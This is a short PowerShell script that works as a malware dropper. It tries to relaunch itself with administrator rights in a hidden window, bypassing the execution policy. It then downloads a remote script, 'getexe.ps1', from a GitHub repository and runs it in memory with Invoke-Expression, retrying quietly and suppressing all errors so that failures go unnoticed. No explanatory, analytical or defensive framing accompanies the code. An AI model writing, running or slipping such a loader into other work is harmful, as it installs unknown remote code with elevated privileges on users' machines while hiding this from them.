# Attempt to elevate to administrative privileges if not already admin
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    try {
        # Relaunch the script with elevated privileges
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs -WindowStyle Hidden -Wait -ErrorAction Stop
        exit 0
    }
    catch {
        # If elevation fails, continue execution without admin privileges
    }
}

# --- Download and Execute getexe.ps1 with Advanced Retry ---
try {
    $url = "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/getexe.ps1"
    $maxRetries = 5
    $retryCount = 0
    $baseDelay = 1000 # Initial delay in milliseconds (1 second)
    $maxDelay = 30000 # Maximum delay in milliseconds (30 seconds)
    $success = $false

    while (-not $success -and $retryCount -lt $maxRetries) {
        try {
            $webClient = New-Object System.Net.WebClient
            $scriptContent = $webClient.DownloadString($url)
            $success = $true
            # Execute the downloaded script
            Invoke-Expression $scriptContent -ErrorAction Stop
        }
        catch {
            $retryCount++
            if ($retryCount -eq $maxRetries) {
                # Final attempt failed, exit silently
                break
            }
            # Calculate exponential backoff with jitter
            $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
            $jitter = Get-Random -Minimum 0 -Maximum 100
            Start-Sleep -Milliseconds ($delay + $jitter)
        }
        finally {
            if ($webClient) { $webClient.Dispose() }
        }
    }
}
catch {
    # Suppress all errors
}
